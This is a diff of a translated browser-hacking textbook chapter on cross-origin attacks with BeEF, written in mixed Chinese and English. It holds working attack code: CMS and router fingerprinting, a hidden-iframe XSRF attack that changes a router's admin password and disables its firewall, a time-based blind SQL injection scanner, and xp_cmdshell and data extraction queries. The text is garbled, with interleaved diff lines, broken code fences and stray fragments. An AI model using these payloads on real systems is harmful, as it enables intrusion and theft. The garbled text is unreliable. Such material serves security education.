+- 最后，为了降低不确定性，会验证图像的宽度和高度。如果图像路径、宽度和高度与先前创建的数据集中的任一条目匹配，则表示匹配成功！资源已被正确识别，如图 9-3 所示。
 
--   最后，为了降低不确定性，会验证图像的宽度和高度。如果图像路径、宽度和高度与先前创建的数据集中的任一条目匹配，则表示匹配成功！资源已被正确识别，如图 9-3 所示。
-
- start figure 
+start figure 
 
 **Figure 9-3:** VMware ESXi 服务器已正确识别。
 
 ![c09f003.tif](img/c09f003.png)
 
- end figure 
+end figure 
 
 ### 请求页面
 
 许多 CMS 与通用 Web 应用指纹识别工具都拥有大量 CMS 类型、版本、主题和插件的数据库。其中之一是由 Chris Sullo（Nikto 作者）创建的 CMS-Explorer，5，其中包含数千个 Drupal、Joomla 和 WordPress 的插件和主题 URL 路径。此类信息在结合 XSS 和 SQLi 等安全漏洞（这些漏洞在 CMS 插件中非常常见）时尤为有用。
 
-要检查应用是否暴露特定路径（例如 [modules/filebrowser/](http://modules/filebrowser/)），可以采用与之前使用图像的方式类似的思路。首先，创建一个包含多个 Drupal 插件名称和路径的数据结构。对于每个要检查的路径，创建一个带有自定义 onerror 和 onload 处理函数的 script 标签。可以使用以下代码片段实现：
+要检查应用是否暴露特定路径（例如 [modules/filebrowser/](http://modules/filebrowser/)），可以采用与之前使用图像的方式类似的思路。首先，创建一个包含多个 Drupal 插件名称和路径的数据结构。对于每个要检查的路径，创建一个带有自定义 `onerror` 和 `onload` 处理函数的 `script` 标签。可以使用以下代码片段实现：
 
 ```
 var target = "http://172.16.37.147";
 
 /* 要检查的资源（名称，路径）*/
 var resources = [
+
   ["Drupal - FileBrowser","modules/filebrowser/"],
   ["Drupal - FFmpeg", "modules/ffmpeg/"],
   ["WordPress - AccessLogs", "wp-content/plugins/access-logs/"]
+
 ];
 
 /* 超路径（要么是 / 要么是 /drupal）*/
@@ -10429,7 +10562,6 @@ function add_tag(src){
 for(var p=0; p < paths.length; p++) {
   // 为每个超路径生成最终 URI
   var uri = target + paths[p] + src;
-  
   var i = document.createElement('script');
   i.src = uri;
   i.style.display = 'none';
@@ -10449,21 +10581,19 @@ for(var c=0; c < resources.length; c++) {
 }
 ```
 
--   如上所示，这里使用的是 script 标签而非 img 标签。运行代码时，如果资源被找到，会出现语法错误（如图 9-4 所示）。这是因为 HTML 文件通常返回 text/html 内容类型，导致 JavaScript 解析错误。
+- 如上所示，这里使用的是 `script` 标签而非 `img` 标签。运行代码时，如果资源被找到，会出现语法错误（如图 9-4 所示）。这是因为 HTML 文件通常返回 `text/html` 内容类型，导致 JavaScript 解析错误。
+- 虽然请求的资源本身不包含 JavaScript，但请注意，此方法易受反攻击。资源可能被修改为脚本，从而让攻击者控制被钩针的浏览器。当然，也可以通过使用 IFrame 的 `sandbox` 属性等进一步缓解。
 
--   虽然请求的资源本身不包含 JavaScript，但请注意，此方法易受反攻击。资源可能被修改为脚本，从而让攻击者控制被钩针的浏览器。当然，也可以通过使用 IFrame 的 sandbox 属性等进一步缓解。
-
- start figure 
+start figure 
 
 **Figure 9-4:** 已识别 Drupal 以及 FileBrowser 插件。
 
 ![c09f004.eps](img/c09f004.png)
 
- end figure 
+end figure 
 
--   这种技术同样可以用于指纹识别提供 Web 界面的设备。下面以 Sagemcom F@ST 2504 路由器 6（由 Sky 提供的宽带路由器）为例。即使你没有这款路由器，本节讨论的技术同样适用于类似设备。
-
--   与许多类似设备一样，该路由器可通过浏览器以 http://192.168.0.1:80 访问。路由器在身份验证前提供多个资源，包括 JavaScript 文件和图像。这正好适合指纹识别，你可以使用以下代码将其识别为 Sagemcom 路由器：
+- 这种技术同样可以用于指纹识别提供 Web 界面的设备。下面以 Sagemcom F@ST 2504 路由器 6（由 Sky 提供的宽带路由器）为例。即使你没有这款路由器，本节讨论的技术同样适用于类似设备。
+- 与许多类似设备一样，该路由器可通过浏览器以 `http://192.168.0.1:80` 访问。路由器在身份验证前提供多个资源，包括 JavaScript 文件和图像。这正好适合指纹识别，你可以使用以下代码将其识别为 Sagemcom 路由器：
 
 ```
 // 默认路由器 IP
@@ -10482,13 +10612,11 @@ var fingerprint_data = new Array(
 );
 
 var dom = document.createElement('b');
-
 for(var u=0; u < fingerprint_data.length; u++) {
    var img = new Image;
    img.id = u;
    img.src = fingerprint_data[u][2] + "://" + target
         + ":" + fingerprint_data[u][1] + fingerprint_data[u][4];
-      
   // onload 事件触发，说明图像已被找到
   img.onload = function() {
     // 再次确认宽度和高度
@@ -10504,30 +10632,27 @@ for(var u=0; u < fingerprint_data.length; u++) {
 }
 ```
 
--   运行前面代码的结果可见 Figure 9-5，它确认了 Sagemcom 路由器可通过 http://192.168.0.1:80 访问。之所以可以确信，是因为两个默认图像均已成功识别。
+- 运行前面代码的结果可见 Figure 9-5，它确认了 Sagemcom 路由器可通过 `http://192.168.0.1:80` 访问。之所以可以确信，是因为两个默认图像均已成功识别。
 
- start figure 
+start figure 
 
 **Figure 9-5:** 路由器指纹识别
 
 ![c09f005.tif](img/c09f005.png)
 
- end figure 
+end figure 
 
-在 2007 年，Gareth Heyes 创建了 jsLanScanner，7，它使用类似技术发现并指纹识别多个嵌入式设备。其指纹数据库相当准确，涵盖了约 200 种不同设备。
+在 2007 年，Gareth Heyes 创建了 `jsLanScanner`，7，它使用类似技术发现并指纹识别多个嵌入式设备。其指纹数据库相当准确，涵盖了约 200 种不同设备。
 
--   现在路由器已成功被发现并指纹识别，下一步通常是处理身份验证，这将在下一节中说明。
+- 现在路由器已成功被发现并指纹识别，下一步通常是处理身份验证，这将在下一节中说明。
 
 # 跨域身份验证检测
 
 大多数实现登录功能的 Web 应用都有仅在身份验证后才可访问的资源，以及供未认证、匿名用户访问的独立资源。
 
-常见的 Web 应用行为包括：当未认证用户请求已认证资源时，返回 403 或 404 HTTP 状态码；而已登录用户请求同一资源则返回 200 状态码。
+常见的 Web 应用行为包括：当未认证用户请求已认证资源时，返回 `403` 或 `404` HTTP 状态码；而已登录用户请求同一资源则返回 `200` 状态码。
 
-
-
-
--   另一种常见行为是在请求一个不存在且受身份验证保护的路径下的资源时，回复 `302` HTTP 重定向状态码。例如，假设你请求 `http://browserhacker.com/admin/non_existent`，其中 `/admin/` 路径下的所有资源都需要用户进行身份验证。如果你是未经身份验证的用户并请求 `/admin/non_existent`，Web 应用会返回 `302` 状态码，并将你重定向到登录页面 `/admin/login`。相反，如果你是已认证的用户并请求 `/admin/non_existent`，则会返回 `404` Not found 错误。
+- 另一种常见行为是在请求一个不存在且受身份验证保护的路径下的资源时，回复 `302` HTTP 重定向状态码。例如，假设你请求 `http://browserhacker.com/admin/non_existent`，其中 `/admin/` 路径下的所有资源都需要用户进行身份验证。如果你是未经身份验证的用户并请求 `/admin/non_existent`，Web 应用会返回 `302` 状态码，并将你重定向到登录页面 `/admin/login`。相反，如果你是已认证的用户并请求 `/admin/non_existent`，则会返回 `404` Not found 错误。
 
 Mike Cardwell 分析了多个社交网络站点，检查它们是否以相同的方式使用 HTTP 状态码。他的分析结果显示，`8` 个 Twitter 站点类似于第二个例子，根据用户会话是否已认证，返回 `302` 或 `404` 状态码。
 
@@ -10548,23 +10673,23 @@ head.appendChild(script);
 
 如从 `Figure 9-6` 可以看出，如果钩子浏览器未登录 Twitter，请求一个不存在的资源（如 `/account`）时会返回 `302` 状态码，这会导致脚本触发 `onload` 事件。
 
- start figure 
+start figure 
 
 **Figure 9-6:** 检测到受害者未登录 Twitter
 
 ![c09f006.tif](img/c09f006.png)
 
- end figure 
+end figure 
 
 如果钩子浏览器已登录 Twitter，如 `Figure 9-7` 所示，请求同一不存在的资源会返回 `404` 状态码，从而执行 `onerror` 事件。
 
- start figure 
+start figure 
 
 **Figure 9-7:** 检测到受害者已登录 Twitter
 
 ![c09f007.eps](img/c09f007.png)
 
- end figure 
+end figure 
 
 监控资源加载时间是另一种跨源技术。如果在会话已认证与未认证之间存在资源加载时间差异，你可以推断出重要信息。利用这些信息，你可以判断浏览器是否已登录到某个应用。
 
@@ -10590,7 +10715,6 @@ function append(){
    i.src = "http://browserhacker.com/drupal/?q=admin";
    var start = new Date().getTime();
    console.log('start:' + start);
-   
    /* 自定义 onload 处理器以监控加载时间*/
    i.onload = function(){
     var end = new Date().getTime();
@@ -10615,21 +10739,23 @@ function append(){
 add_iframe = setInterval(function(){append()},500);
 ```
 
-继续以 Drupal 示例为例，`Figure 9-8` 和 `Figure 9-9` 展示了运行前面脚本的结果。请注意，sum 和平均时间有所不同。
 
- start figure 
+
+继续以 Drupal 示例为例，`Figure 9-8` 和 `Figure 9-9` 展示了运行前面脚本的结果。请注意，`sum` 和平均时间有所不同。
+
+start figure
 
 **Figure 9-8:** 检测到受害者未登录 Drupal
 
 ![c09f008.tif](img/c09f008.png)
 
- end figure start figure 
+end figure start figure
 
 **Figure 9-9:** 检测到受害者已登录 Drupal
 
 ![c09f009.tif](img/c09f009.png)
 
- end figure 
+end figure
 
 准确识别钩子浏览器是否已登录到某个 Web 应用，有助于更可靠地发起攻击。将此知识与未使用 XSRF 令牌保护的资源结合，你可能会在受害者的身份代理下执行各种操作。
 
@@ -10645,22 +10771,19 @@ XSRF 攻击利用了 web 应用对用户 HTTP 请求的信任。当你已知用�
 
 攻击者可以伪造跨源 AJAX 请求该脆弱资源。由于浏览器会自动在请求中包含用户的 Cookie，这些请求看起来是合法的、已认证的请求。使用 JavaScript 动态创建并提交 HTML 表单，同样可以生成伪造请求。这些请求通常会被 Web 应用信任，因为它依赖于用户已登录以及 Cookie 随每个请求一起发送的事实。此类漏洞之所以可被利用，是因为 HTTP 请求可以重播（replay），而 HTTP 协议并不规定如何处理唯一请求。
 
-考虑另一个场景：用户已登录到 Cisco c24e000 路由器的管理界面。如果该 Web 管理界面易受 XSRF 攻击，则每个请求都可以通过 knowing the required parameters 进行重播。攻击者因此可以 trick the user into executing the following code from another origin:
+考虑另一个场景：用户已登录到 Cisco `c24e000` 路由器的管理界面。如果该 Web 管理界面易受 XSRF 攻击，则每个请求都可以通过 knowing the required parameters 进行重播。攻击者因此可以 trick the user into executing the following code from another origin:
 
+- [使用 BeEF 执行函数](https://wiki.example.org/beef_execute_function) 的代码会在 `beef.execute(function() {` 代码块中运行。
 
+1. 在代码块中，首先定义了变量 `gateway` 和 `passwd`，分别指向目标网关地址 `http://192.168.100.2/` 以及新密码 `new_password`。
 
+2. 通过 `beef.dom.createIframeXsrfForm` 创建第一个隐藏的 iframe，向 `gateway + "apply.cgi"` 发送 **POST** 请求，隐藏表单中包含了多个字段，如 `submit_button`、`action`、`PasswdModify`、`http_enable`、`https_enable`、`remote_mgt_https`、`wait_time`、`need_reboot`、`http_passwd`、`http_passwdConfirm`、`_http_enable`、`_https_enable`、`web_wl_filter`、`remote_management`、`_remote_mgt_https`、`remote_upgrade`、`remote_ip_any`、`http_wanport`、`nf_alg_sip`、`ctf_disable`、`upnp_enable`、`upnp_config`、`upnp_internet_dis` 等，用于 **开启远程管理功能**，并将管理员密码改为 `new_password`。
 
--   [使用 BeEF 执行函数](https://wiki.example.org/beef_execute_function) 的代码会在 `beef.execute(function() {` 代码块中运行。
+3. 通过第二个 `beef.dom.createIframeXsrfForm` 创建另一个隐藏的 iframe，向同一 URL 发送 **POST** 请求，隐藏表单中包含了 `block_wan`、`block_loopback`、`multicast_pass`、`ipv6_multicast_pass`、`ident_pass`、`block_cookie`、`block_java`、`block_proxy`、`block_activex`、`wait_time`、`ipv6_filter`、`filter` 等字段，用于 **禁用防火墙** 以及 **关闭 Java/ActiveX 检查**。
 
-1.  在代码块中，首先定义了变量 `gateway` 和 `passwd`，分别指向目标网关地址 `http://192.168.100.2/` 以及新密码 `new_password`。
+4. 最后，使用 `beef.net.send` 发送 exploit 请求，目标是 `<%= @command_url %>`, 参数 `command_id`，并期待返回 `result=exploit attempted`。
 
-2.  通过 `beef.dom.createIframeXsrfForm` 创建第一个隐藏的 iframe，向 `gateway + "apply.cgi"` 发送 **POST** 请求，隐藏表单中包含了多个字段，如 `submit_button`、`action`、`PasswdModify`、`http_enable`、`https_enable`、`remote_mgt_https`、`wait_time`、`need_reboot`、`http_passwd`、`http_passwdConfirm`、`_http_enable`、`_https_enable`、`web_wl_filter`、`remote_management`、`_remote_mgt_https`、`remote_upgrade`、`remote_ip_any`、`http_wanport`、`nf_alg_sip`、`ctf_disable`、`upnp_enable`、`upnp_config`、`upnp_internet_dis` 等，用于 **开启远程管理功能**，并将管理员密码改为 `new_password`。
-
-3.  通过第二个 `beef.dom.createIframeXsrfForm` 创建另一个隐藏的 iframe，向同一 URL 发送 **POST** 请求，隐藏表单中包含了 `block_wan`、`block_loopback`、`multicast_pass`、`ipv6_multicast_pass`、`ident_pass`、`block_cookie`、`block_java`、`block_proxy`、`block_activex`、`wait_time`、`ipv6_filter`、`filter` 等字段，用于 **禁用防火墙** 以及 **关闭 Java/ActiveX 检查**。
-
-4.  最后，使用 `beef.net.send` 发送 exploit 请求，目标是 `<%= @command_url %>`, 参数 `command_id`，并期待返回 `result=exploit attempted`。
-
-5.  `cleanup` 函数用于在 15 秒后移除两个 iframe，代码如下：
+5. `cleanup` 函数用于在 15 秒后移除两个 iframe，代码如下：
 
 ```javascript
 cleanup = function() {
@@ -10670,13 +10793,13 @@ cleanup = function() {
 setTimeout("cleanup()", 15000);
 ```
 
-6.  整段代码表明，攻击者可以在用户浏览器中动态创建两个不可见的 iframe，每个 iframe 包含一个隐藏表单，从而 **在不通知用户的情况下** 完成对路由器配置的修改：开启远程管理、修改管理员密码、禁用防火墙以及关闭 Java/ActiveX 检查。
+6. 整段代码表明，攻击者可以在用户浏览器中动态创建两个不可见的 iframe，每个 iframe 包含一个隐藏表单，从而 **在不通知用户的情况下** 完成对路由器配置的修改：开启远程管理、修改管理员密码、禁用防火墙以及关闭 Java/ActiveX 检查。
 
-7.  这些更改会在后台 silently 完成，攻击者随后可以通过远程管理端口（如 31337）登录路由器，获得完整控制权。
+7. 这些更改会在后台 silently 完成，攻击者随后可以通过远程管理端口（如 31337）登录路由器，获得完整控制权。
 
-8.  代码使用 BeEF 的 `dom.js` 核心 API `createIframeXsrfForm`，该方法会创建一个不可见的 iframe（宽度/高度 1px，visibility hidden），并在其内部生成一个 form，填充所有隐藏的 input 字段，然后提交表单。利用 HTML 表单而非 XMLHttpRequest 的方式更可靠，因为可以避免不同浏览器对 XMLHttpRequest 对象的实现差异。
+8. 代码使用 BeEF 的 `dom.js` 核心 API `createIframeXsrfForm`，该方法会创建一个不可见的 iframe（宽度/高度 1px，visibility hidden），并在其内部生成一个 form，填充所有隐藏的 input 字段，然后提交表单。利用 HTML 表单而非 XMLHttpRequest 的方式更可靠，因为可以避免不同浏览器对 XMLHttpRequest 对象的实现差异。
 
-9.  在 “攻击密码重置与 XSRF” 章节中，描述了路由器管理员密码的**无需旧密码**即可被重置的常见安全漏洞。John Carroll 发现 SuperHub 路由器几乎所有 UI 资源均易受 XSRF 攻击，且可直接重置管理员密码。
+9. 在 “攻击密码重置与 XSRF” 章节中，描述了路由器管理员密码的**无需旧密码**即可被重置的常见安全漏洞。John Carroll 发现 SuperHub 路由器几乎所有 UI 资源均易受 XSRF 攻击，且可直接重置管理员密码。
 
 10. 因此，如果用户已在浏览器中完成身份验证，攻击者可以利用以下代码段在目标路由器的页面上执行三个请求：
 
@@ -10700,13 +10823,10 @@ setTimeout("cleanup()", 15000);
 
 与同一表单加入 anti‑XSRF token 后的形式类似：
 
+- [使用交叉站点脚本绕过反 XSRF 令牌的方法]https://example.org
+反 XSRF 令牌旨在减轻跨站请求伪造（CSRF）攻击的成功率，但并不针对跨站脚本（XSS）攻击。如果目标 Web 应用使用反 XSRF 令牌，但你能够控制目标源（即钩子），则可以绕过此保护机制。如前所述，单个 XSS 漏洞可能让攻击者完全控制受影响的源。
 
-
-
--   [使用交叉站点脚本绕过反 XSRF 令牌的方法]https://example.org
-   反 XSRF 令牌旨在减轻跨站请求伪造（CSRF）攻击的成功率，但并不针对跨站脚本（XSS）攻击。如果目标 Web 应用使用反 XSRF 令牌，但你能够控制目标源（即钩子），则可以绕过此保护机制。如前所述，单个 XSS 漏洞可能让攻击者完全控制受影响的源。
-
-   攻击者若能控制目标源，将从包含表单的页面中提取反 XSRF 令牌，并将其加入新的恶意表单中。由于使用了正确的令牌，攻击将成功。
+攻击者若能控制目标源，将从包含表单的页面中提取反 XSRF 令牌，并将其加入新的恶意表单中。由于使用了正确的令牌，攻击将成功。
 
 # 跨域资源检测
 
@@ -10771,7 +10891,7 @@ getFormActions(document);
 
 上述代码通过 `getLinks()` 函数获取当前文档中所有 `<a>` 链接，并使用 `isSameOrigin()` 判断每个链接的资源是否为同源；同样，`getFormActions()` 函数枚举所有 `<form>` 元素的 `action` 属性，并通过创建临时 `<a>` 元素调用 `isSameOrigin()` 来判断其资源是否同源。由于 `isSameOrigin()` 只接受 `<a>` 元素，代码通过动态生成 `<a>` 元素来复用该函数。
 
-Figure 9-10 展示了在 http://localhost/text.html 托管的测试页面上运行上述代码的结果，页面内容如下：
+Figure 9-10 展示了在 `http://localhost/text.html` 托管的测试页面上运行上述代码的结果，页面内容如下：
 
 ```
 <html><body>
@@ -10784,9 +10904,7 @@ Figure 9-10 展示了在 http://localhost/text.html 托管的测试页面上运�
  <form action="/login"></form>
 </body></html>
 [ox
-</think>
-
-
+```
 
 ``` 
 var xhr = new XMLHttpRequest();
@@ -10809,12 +10927,10 @@ xhr.send();
 This 代码调用 `getLinks()` 和 `getFormActions()` 在从 XHR 响应中创建的新 `Document` 上，变量 `doc` 保存该文档。注意 `DOMParser.parseFromString()` 用于此目的。对于像 Chrome 和 Safari 这类不支持 `parseFromString()` 的浏览器，可以使用 Eli Grey 提供的 polyfill 来重写 `parseFromString()` 原型：
 
 ```
-``` 
 (function(DOMParser) {  
  "use strict";  
  var DOMParser_proto = DOMParser.prototype  
  , real_parseFromString = DOMParser_proto.parseFromString;
-
  // Firefox/Opera/IE 抛出错误，无法处理不支持的类型  
  try {  
   // WebKit 在不支持的类型上返回 null  
@@ -10823,26 +10939,43 @@ This 代码调用 `getLinks()` 和 `getFormActions()` 在从 XHR 响应中创建
    return;  
   }  
  } catch (ex) {}  
+```
 
- DOMParser_proto.parseFromString = function(markup, type) {  
+
+
+```javascript
+DOMParser_proto.parseFromString = function(markup, type) {  
+
   if (/^\s*text\/html\s*(?:;|$)/i.test(type)) {  
+
    var doc = document.implementation.createHTMLDocument("")
+
    , doc_elt = doc.documentElement
+
    , first_elt;
 
   doc_elt.innerHTML = markup;
+
   first_elt = doc_elt.firstElementChild;
 
   if (doc_elt.childElementCount === 1
+
   && first_elt.localName.toLowerCase() === "html") {  
+
    doc.replaceChild(first_elt, doc_elt);  
+
   }  
 
   return doc;  
+
  } else {  
+
   return real_parseFromString.apply(this, arguments);  
+
  }  
+
 };  
+
 }(DOMParser));
 ```
 
@@ -10850,17 +10983,17 @@ Now armed with this code, you are able to enumerate both same and cross-origin r
 
 # 跨域 Web 应用程序漏洞检测
 
-显然，同源策略 (SOP) 限制了很多攻击类型。但我们知道，只要有决心，总会有绕过的方法。各种技术可以在不违反 SOP 的前提下跨域进行攻击。
+显然，同源策略 `SOP` 限制了很多攻击类型。但我们知道，只要有决心，总会有绕过的方法。各种技术可以在不违反 `SOP` 的前提下跨域进行攻击。
 
-这些技术在下一节中讨论。包括如何在不同来源的浏览器（即钩装的浏览器）中识别跨站脚本 (XSS) 和 SQL 注入漏洞。
+这些技术在下一节中讨论。包括如何在不同来源的浏览器（即钩装的浏览器）中识别跨站脚本 `XSS` 和 `SQL` 注入漏洞。
 
 ## SQL 注入漏洞
 
-SQL 注入（SQLi）漏洞产生于你能够修改 Web 应用向数据库发送的 SQL 语句时出现。我们不会对 SQL 注入进行过多的分析，但推荐两本经典资源：《数据库黑客手册》和贾斯汀·克拉克的《SQL 注入攻击与防御》。
+`SQL` 注入 `SQLi` 漏洞产生于你能够修改 Web 应用向数据库发送的 `SQL` 语句时出现。我们不会对 `SQL` 注入进行过多的分析，但推荐两本经典资源：《数据库黑客手册》和贾斯汀·克拉克的《`SQL` 注入攻击与防御》。
 
 ### 常规 SQL 注入检测
 
-SQL 注入攻击根据缺陷的性质可以分为多种类别。通常可以通过 HTTP 响应中返回的数据类型来区分。如果返回类似下面的 SQL 错误信息，则说明存在错误基于 SQLi：
+`SQL` 注入攻击根据缺陷的性质可以分为多种类别。通常可以通过 `HTTP` 响应中返回的数据类型来区分。如果返回类似下面的 `SQL` 错误信息，则说明存在错误基于 `SQLi`：
 
 ```
 You have an error in your SQL syntax; check the \
@@ -10868,16 +11001,13 @@ manual that corresponds to your MySQL server version \
 for the right syntax to use near ''' at line 1
 ```
 
-在某些情况下，Web 应用即使 SQL 语句本身包含错误，也不会返回任何错误信息。此类情况通常称为盲 SQLi，因为从数据库或应用层面没有任何错误返回（因此得名）。
+在某些情况下，Web 应用即使 `SQL` 语句本身包含错误，也不会返回任何错误信息。此类情况通常称为盲 `SQLi`，因为从数据库或应用层面没有任何错误返回（因此得名）。
 
-在这种情况下，仍可以通过比较正常请求与恶意请求的 HTTP 响应差异来判断是否影响特定资源。这些差异主要有两种：一种是 **Content‑Length** 不同，导致返回的内容体发生变化；另一种是 **响应时间** 不同，例如正常响应需要 1 秒，而恶意请求则耗时更长。
+在这种情况下，仍可以通过比较正常请求与恶意请求的 `HTTP` 响应差异来判断是否影响特定资源。这些差异主要有两种：一种是 **`Content‑Length`** 不同，导致返回的内容体发生变化；另一种是 **响应时间** 不同，例如正常响应需要 1 秒，而恶意请求则耗时更长。
 
+- [目前仅支持 `MySQL`、`PostgreSQL` 和 `MSSQL`，因为它们具有时间延迟的 `SQL` 语句。正如 `Chema Alonso` 所示，19 仍然可以通过复杂的查询诱导时间延迟。此外，还可以使用外带确认，因为 `Oracle` 支持函数来发起 `HTTP` 和 `DNS` 请求：
 
-
-
--   [目前仅支持 MySQL、PostgreSQL 和 MSSQL，因为它们具有时间延迟的 SQL 语句。正如 Chema Alonso 所示，19 仍然可以通过复杂的查询诱导时间延迟。此外，还可以使用外带确认，因为 Oracle 支持函数来发起 HTTP 和 DNS 请求：
-
-``` 
+```javascript
 beef.execute(function() {
 
 // time-delay in seconds
@@ -10898,6 +11028,7 @@ var param = '<%= @parameter %>';
 * in case of nested joins. param and delay are 
 * placeholders replaced later in create_vector()
 */
+
 var vectors = [
  "param AND delay", "param' AND delay",
  "param) AND delay", "param AND delay --",
@@ -10909,11 +11040,13 @@ var vectors = [
 ];
 
 var db_types = ["mysql", "mssql", "postgresql"];
+
 var final_vectors = [];
 
 /* every DB has a different time-delay statement
 * for Oracle/DB2 and other see Chema Alonso Heavy-queries research:
 */ http://technet.microsoft.com/en-us/library/cc512676.aspx
+
 function create_vector(vector, db_type){
  var result = "";
  if(db_type == "mysql")
@@ -10925,7 +11058,6 @@ function create_vector(vector, db_type){
  if(db_type == "postgresql")
     result = vector.replace("param",param) 
              .replace("delay","PG_SLEEP(" + delay + ")");
-
  console.log("Vector before URL encoding: " + result);
  return encodeURI(result);
 }
@@ -10941,6 +11073,7 @@ function populate_global_vectors(){
 }
 
 var vector_index = 0;
+
 function next_vector(){
  result = final_vectors[vector_index];
  vector_index++;
@@ -10949,6 +11082,7 @@ function next_vector(){
 
 var send_interval;
 var successfulVector = "";
+
 function sendRequests(){
  var vector = next_vector();
  var url = uri.replace(param, vector);
@@ -10976,99 +11110,117 @@ var response_time;
 beef.net.forge_request("http", "GET", host, port, uri,
 null, null, null, delay + 2, 'script', true, null,function(response){
  response_time = response.duration;
-
  send_interval = setInterval(function(){
     sendRequests()},response_time + 500); //can be adjusted
  });
 });
 ```
 
-When the previous code is injected into a hooked browser, populate_global_vectors() is called and attack vectors are created according to the supported database types and the payloads listed in the vectors array. These payloads are not comprehensive, but should be enough for most attacks. You can of course add more of them, for example, closing more parentheses or using different boolean keywords, to cover situations where nested joins or very long and complex queries are performed.
+When the previous code is injected into a hooked browser, `populate_global_vectors()` is called and attack vectors are created according to the supported database types and the payloads listed in the `vectors` array. These payloads are not comprehensive, but should be enough for most attacks. You can of course add more of them, for example, closing more parentheses or using different boolean keywords, to cover situations where nested joins or very long and complex queries are performed.
 
-The next step in your attack is sending a request without any attack vector, to monitor the normal response timing. This is important in order to adjust the time-delay for subsequent attack payloads, in case the target already takes several seconds to reply to normal requests. After the baseline response time has been determined, all the available attack vectors are sent with the sendRequests() function. Each XHR request is executed with a callback that checks for the response timing after the response arrives. If the response time is equal or bigger than the injected delay, it suggests the injection was successful and the time-based SQLi is confirmed. In Figure 9-11 and Figure 9-12, you can see what’s happening under the hood when the code snippet is injected in a browser hooked with BeEF.
+The next step in your attack is sending a request without any attack vector, to monitor the normal response timing. This is important in order to adjust the time-delay for subsequent attack payloads, in case the target already takes several seconds to reply to normal requests. After the baseline response time has been determined, all the available attack vectors are sent with the `sendRequests()` function. Each `XHR` request is executed with a callback that checks for the response timing after the response arrives. If the response time is equal or bigger than the injected delay, it suggests the injection was successful and the time-based `SQLi` is confirmed. In Figure 9-11 and Figure 9-12, you can see what’s happening under the hood when the code snippet is injected in a browser hooked with `BeEF`.
 
- start figure 
+start figure 
 
-**Figure 9-11:** Time delay of a successful SQLi attack
+**Figure 9-11:** Time delay of a successful `SQLi` attack
 
 ![c09f011.eps](img/c09f011.png)
 
- end figure   start figure 
+end figure   start figure 
 
-**Figure 9-12:** Logging of a successful SQLi attack
+**Figure 9-12:** Logging of a successful `SQLi` attack
 
 ![c09f012.eps](img/c09f012.png)
 
- end figure 
+end figure 
 
 ### Cross-origin Blind SQL Injection Exploitation
 
-Now you are able to determine which cross-origin resource is vulnerable to SQL injection, and also potentially which database is used. Armed with this information, you can now look to execute operating system commands or extrude database data.
+Now you are able to determine which cross-origin resource is vulnerable to `SQL` injection, and also potentially which database is used. Armed with this information, you can now look to execute operating system commands or extrude database data.
 
-Executing operating system commands largely depends on whether the database has been misconfigured, in particular those settings related to the level of permissions and privileges assigned to the current database user. If the database is running MSSQL, for instance, you can use the xp_cmdshell() stored procedure to execute commands within the operating system, potentially taking it over. Bear in mind, though, that the application’s database user must have the sysadmin role in order to use this stored procedure. As of MSSQL version 2005, this feature is disabled by default, although it can be re-enabled by calling the sp_configure() stored procedure.20
+Executing operating system commands largely depends on whether the database has been misconfigured, in particular those settings related to the level of permissions and privileges assigned to the current database user. If the database is running `MSSQL`, for instance, you can use the `xp_cmdshell()` stored procedure to execute commands within the operating system, potentially taking it over. Bear in mind, though, that the application’s database user must have the `sysadmin` role in order to use this stored procedure. As of `MSSQL` version 2005, this feature is disabled by default, although it can be re-enabled by calling the `sp_configure()` stored procedure.20
 
-You can use the following MSSQL statements to check whether these stored procedures can be executed. Of course, they need to be formatted in the appropriate HTTP request to be smuggled to the database:
+You can use the following `MSSQL` statements to check whether these stored procedures can be executed. Of course, they need to be formatted in the appropriate `HTTP` request to be smuggled to the database:
 
 ```
 EXEC sp_configure 'show advanced options',1;RECONFIGURE
 EXEC master..xp_cmdshell('ping –n 10 localhost')
 ```
 
-The first request is needed in order to re-enable the xp_cmdshell() stored procedure in case it’s disabled. The second request is the one that should create a response time delay if the stored procedure is (or was) successfully enabled, and the user has the sysadmin role. In this example, the vector is inducing a time-delay by using the standard ping utility and pinging localhost 10 times, which should take approximately 9 to 10 seconds to complete. If you notice the expected delay, you can carry on executing other operating system commands.
 
-Regarding data extraction, the previous code snippets could be updated by adding support for a binary extraction algorithm. This would be similar to those proposed by Chris Anley in his “Advanced SQL injection” paper21 and implemented in Sqlmap. For instance, to determine if the first bit of the first byte of the current database name is either 0 or 1, the following vector could be used in MSSQL environments:
+
+第一个请求是必需的，以便在`xp_cmdshell()`存储过程被禁用的情况下重新启用它。第二个请求则是：如果存储过程已经（或曾经）成功启用，并且用户具有`sysadmin`角色，则应该产生响应时间延迟。在这个示例中，向量通过使用标准`ping`实用程序并`ping localhost` 10次来诱导时间延迟，这大约需要9到10秒才能完成。如果你注意到预期的延迟，就可以继续执行其他操作系统命令。
+
+关于数据提取，前面的代码片段可以通过添加对二进制提取算法的支持来更新。这将类似于Chris Anley在他的“Advanced SQL injection”论文21中提出并在`Sqlmap`中实现的算法。例如，要确定当前数据库名称第一个字节的第一位是0还是1，可以在MSSQL环境中使用以下向量：
 
 ```
 declare @s varchar(8000) select @s = db_name() if (ascii(substring \ 
 (@s, 1, 1)) & (power(2, 0))) > 0 waitfor delay '0:0:5' 
 ```
 
-If the response is delayed for 5 seconds, you can reliably determine the first bit is 1. The process would continue for the second bit of the first byte and so on, with the next vector being:
+如果响应延迟了5秒，你可以可靠地确定第一位是1。该过程将继续处理第一个字节的第二位，依此类推，下一个向量是：
 
 ```
 declare @s varchar(8000) select @s = db_name() if (ascii(substring \ 
 (@s, 1, 1)) & (power(2, 1))) > 0 waitfor delay '0:0:5'
 ```
 
+数据提取结合时间延迟在速度上显然不是最优的。你可能会发送数百甚至数千次请求；要获取一个8字符的词，需要64次请求。请记住，你不必按顺序发送请求，等待一个请求完成后再发送下一个。在这种情况下，XHR的异步特性非常有用。你可以使用`WebWorkers`与类似线程的环境来加速数据获取过程。
 
-
-
-数据提取结合时间延迟在速度上显然不是最优的。你可能会发送数百甚至数千次请求；要获取一个 8 字符的词，需要 64 次请求。请记住，你不必按顺序发送请求，等待一个请求完成后再发送下一个。在这种情况下，XHR 的异步特性非常有用。你可以使用 WebWorkers 与类似线程的环境来加速数据获取过程。
-
-请参考下面的故意存在漏洞的 ASP.NET 示例，它使用 MSSQL 2008，并在 book_id 参数上存在可以跨来源（cross-origin）利用的 SQL 注入漏洞。下面是 C# 服务器端代码：
